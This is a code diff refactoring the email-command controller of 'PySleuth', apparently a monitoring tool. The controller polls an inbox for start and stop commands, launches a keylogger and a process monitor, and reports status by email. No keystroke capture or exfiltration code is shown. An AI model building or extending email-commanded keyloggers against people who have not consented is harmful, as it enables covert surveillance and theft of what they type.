@@ -3,10 +3,13 @@ import time
 
 from .base import BaseController
 from ..core.email import EmailSender, EmailReceiver, EmailClearer
+from ..core.signal import Signal
 from ..config import ConfigHandler
 
 
 class EmailController(BaseController):
+    SIG_shutdown = Signal()
+
     def __init__(self, master):
         super(EmailController, self).__init__()
 
@@ -28,9 +31,13 @@ class EmailController(BaseController):
         progMail = cfg.get("program-email")
         password = os.getenv('PYSLEUTH_EMAIL_PWD')
 
-        assert adminMail is not None
-        assert progMail is not None
-        assert password is not None
+        try:
+            assert adminMail is not None
+            assert progMail is not None
+            assert password is not None
+        except AssertionError as e:
+            # TODO:
+            quit(1)
 
         self.sender = EmailSender(progMail, adminMail, password)
         self.receiver = EmailReceiver(progMail, adminMail, password)
@@ -45,7 +52,7 @@ class EmailController(BaseController):
 
         self._sendMessage("PySleuth is awaiting startup signal")
 
-        while True:
+        while self.master.RUNNING:
             cmd = self.receiver.readRecent()
             if cmd is None:
                 continue
@@ -62,20 +69,20 @@ class EmailController(BaseController):
         self.clearer.login()
 
         self.isActive = True
-    
+
     def logout(self):
         self.sender.logout()
         self.receiver.logout()
         self.clearer.logout()
 
         self.isActive = False
-    
+
     def __del__(self):
         if self.isActive:
             self.logout()
 
         assert not self.isActive
-    
+
     def _sendMessage(self, message: str):
         self.sender.addHeaders()
         self.sender.attachPlainText(message)
@@ -88,11 +95,11 @@ class EmailController(BaseController):
             self._onStartProgram()
         elif cmd == "stop":
             self._onStopProgram()
-    
+
     # --------------------------------------------------------------
     # Command processing
     # --------------------------------------------------------------
-    
+
     def _onStartProgram(self):
         self.master.ctrls.keyloggerctrl.startWorker()
         self.master.ctrls.procMntrCtrl.startWorker()
@@ -102,7 +109,8 @@ class EmailController(BaseController):
         self._sendMessage("PySleuth is up and running!")
 
         self.master.RUNNING = True
-    
+
     def _onStopProgram(self):
-        self._sendMessage("Shutdown command received")
-        raise Exception("Shutdown command received ...")
+        msg = "Shutdown command received."
+        self._sendMessage(msg)
+        self.SIG_shutdown.emit()
